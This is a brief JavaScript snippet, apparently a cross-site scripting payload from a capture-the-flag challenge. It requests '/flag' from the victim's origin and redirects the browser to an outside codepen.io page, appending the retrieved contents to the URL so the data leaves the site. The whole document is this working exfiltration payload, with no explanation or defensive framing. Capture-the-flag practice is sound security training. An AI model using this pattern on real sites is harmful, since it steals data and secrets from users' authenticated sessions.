fetch('/flag')
  .then(r => r.text())
  .then(flag => {
    location.href = "https://codepen.io/rishaldwivedi/full/myJajjG#flag=" + encodeURIComponent(flag);
  });
